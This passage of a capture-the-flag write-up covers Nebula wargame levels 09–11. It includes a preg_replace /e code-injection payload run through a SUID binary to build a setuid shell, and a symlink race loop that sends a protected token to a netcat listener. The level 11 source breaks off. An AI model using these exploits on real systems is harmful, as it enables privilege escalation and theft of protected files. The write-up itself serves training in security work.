</span><span class='line'>
</span><span class='line'><span class="nv">$output</span> <span class="o">=</span> <span class="nx">markup</span><span class="p">(</span><span class="nv">$argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="nv">$output</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>In the <code>flag09</code> directory, we have the above PHP sample as well as a SUID binary.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level09@nebula:~<span class="nv">$ </span><span class="nb">cd</span> ~flag09
</span><span class='line'>level09@nebula:/home/flag09<span class="nv">$ </span>ls -lh
</span><span class='line'>total 8.0K
</span><span class='line'>-rwsr-x--- 1 flag09 level09 7.1K 2011-11-20 21:22 flag09
</span><span class='line'>-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
</span></code></pre></td></tr></table></div></figure>


<p>At first I managed to solve this one really fast. When <code>flag09</code> is invoked with <code>-h</code>, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level09@nebula:/home/flag09<span class="nv">$ </span>./flag09 -a
</span><span class='line'>Interactive shell
</span><span class='line'>
</span><span class='line'>php &gt; system<span class="o">(</span><span class="s2">&quot;id&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1010<span class="o">(</span>level09<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1010<span class="o">(</span>level09<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>990<span class="o">(</span>flag09<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>990<span class="o">(</span>flag09<span class="o">)</span>,1010<span class="o">(</span>level09<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>With this I would have been able to prepare the small <code>flag09</code> setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.</p>

<p>The PHP code basically had 2 main functions. <code>markup()</code> and <code>spam()</code>. <code>markup()</code> would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching <code>[email addr]</code> where <em>addr</em> will be the extracted part. It then as a callback executes <code>spam()</code> which will convert <code>.</code> to <code>dot</code> and <code>@</code> to <code>AT</code>. I took a really long time researching the <code>preg_replace()</code> functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when <code>preg_replace()</code> is called with the <code>e</code> modifier. <a href="http://www.madirish.net/402">This</a> blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">here</a> helps develop a payload for exploitation. The PHP documentation has a sample of <code>&lt;h1&gt;{${eval($_GET[php_code])}}&lt;/h1&gt;</code> which is what I used to finish the final payload for this level.</p>

<p>Another thing to note about the PHP code is the <code>$use_me</code> variable passed to the <code>markup()</code> function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)</p>

<p>So, to solve level09:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level09@nebula:/home/flag09<span class="nv">$ </span><span class="nb">echo</span> -ne <span class="s2">&quot;[email {\${system(\$use_me)}}]&quot;</span> &gt; /var/tmp/flag09.txt
</span><span class='line'>
</span><span class='line'>level09@nebula:/home/flag09<span class="nv">$ </span>cat /var/tmp/flag09.txt
</span><span class='line'><span class="o">[</span>email <span class="o">{</span><span class="k">${</span><span class="nv">system</span><span class="p">(</span><span class="nv">$use_me</span><span class="p">)</span><span class="k">}</span><span class="o">}]</span>
</span><span class='line'>
</span><span class='line'>level09@nebula:/home/flag09<span class="nv">$ </span>./flag09 /var/tmp/flag09.txt <span class="s2">&quot;gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09&quot;</span>
</span><span class='line'>PHP Notice:  Undefined variable:  in /home/flag09/flag09.php<span class="o">(</span>15<span class="o">)</span> : regexp code on line 1
</span><span class='line'>
</span><span class='line'>level09@nebula:/home/flag09<span class="nv">$ </span>/var/tmp/flag09
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h3>intermission</h3>

<p>From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)</p>

<p>I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
Lets get to them!</p>

<h2>level10</h2>

<p><a href="https://exploit-exercises.com/nebula/level10/">Level10&rsquo;s Description</a>:</p>

<blockquote><p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p></blockquote>


<p>With the description we are provided with the source code of a small PHP program:</p>

<figure class='code'><figcaption><span>basic.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>  <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>      <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connecting to %s:18211 .. &quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
</span><span class='line'>      <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to connect to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define HITHERE &quot;.oO Oo.\n&quot;</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to write banner to host %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'><span class="cp">#undef HITHERE</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Connected!</span><span class="se">\n</span><span class="s">Sending file .. &quot;</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Damn. Unable to open file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Unable to read from file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
</span><span class='line'>          <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;wrote file!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You don&#39;t have access to %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with <code>nc -lk 18211</code> and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the <code>flag10</code> binary as I did not have read access to this.</p>

<p>The problem with this program through is the fact that it checks if the file can be read using <code>access()</code>, then only later opens it using <code>open()</code>. Using this method it may be possible to change out the file before it hits the <code>open()</code> method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called <a href="http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">TOCTTOU</a>. The Wikipedia article describes almost exactly the same scenario as we have here.</p>

<p>My plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the <code>flag10</code> binary in its own loop as well.</p>

<p>So, to solve level10:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level10@nebula:/home/flag10<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span>ln -sf /var/tmp/shell.c /var/tmp/flag10-token<span class="p">;</span> ln -sf /home/flag10/token /var/tmp/flag10-token<span class="p">;</span> <span class="k">done</span> <span class="p">&amp;</span>
</span><span class='line'><span class="o">[</span>1<span class="o">]</span> 14219
</span><span class='line'>
</span><span class='line'><span class="c"># the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant.</span>
</span><span class='line'>
</span><span class='line'>level10@nebula:/home/flag10<span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do</span> ./flag10 /var/tmp/flag10-token 192.168.217.1<span class="p">;</span> <span class="k">done</span>
</span><span class='line'>You don<span class="s1">&#39;t have access to /var/tmp/flag10-token</span>
</span><span class='line'><span class="s1">You don&#39;</span>t have access to /var/tmp/flag10-token
</span><span class='line'>Connecting to 192.168.217.1:18211 .. Connected!
</span><span class='line'>Sending file .. wrote file!
</span><span class='line'>Connecting to 192.168.217.1:18211 .. Connected!
</span><span class='line'>Sending file .. wrote file!
</span><span class='line'>Connecting to 192.168.217.1:18211 .. Connected!
</span><span class='line'>Sending file .. wrote file!
</span></code></pre></td></tr></table></div></figure>


<p>On my netcat listener I now had:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~ » nc -lk 18211
</span><span class='line'>.oO Oo.
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int main<span class="o">(</span>void<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    setresuid<span class="o">(</span>geteuid<span class="o">()</span>, geteuid<span class="o">()</span>, geteuid<span class="o">())</span><span class="p">;</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>.oO Oo.
</span><span class='line'>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
</span><span class='line'>.oO Oo.
</span><span class='line'>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
</span><span class='line'>.oO Oo.
</span><span class='line'>615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
</span><span class='line'>.oO Oo.
</span></code></pre></td></tr></table></div></figure>


<p>With the token file read, we end the level:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level10@nebula:/home/flag10<span class="nv">$ </span>su - flag10
</span><span class='line'>Password:
</span><span class='line'>flag10@nebula:~<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level11</h2>

<p><a href="https://exploit-exercises.com/nebula/level11/">Level11&rsquo;s Description</a>:</p>

<blockquote><p>The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.</p></blockquote>


<p>With the description we are provided with the source code of a small PHP program:</p>

<figure class='code'><figcaption><span>level11.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm"> * Return a random, non predictable file, and return the file descriptor for it.</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">path</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">pid</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;TEMP&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">&quot;%s/%d.%c%c%c%c%c%c&quot;</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span>
</span><span class='line'>      <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span>
</span><span class='line'>      <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">&#39;A&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
</span><span class='line'>      <span class="sc">&#39;0&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
</span><span class='line'>  <span class="n">unlink</span><span class="p">(</span><span class="o">*</span><span class="n">path</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">process</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">key</span> <span class="o">=</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">buffer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">;</span>
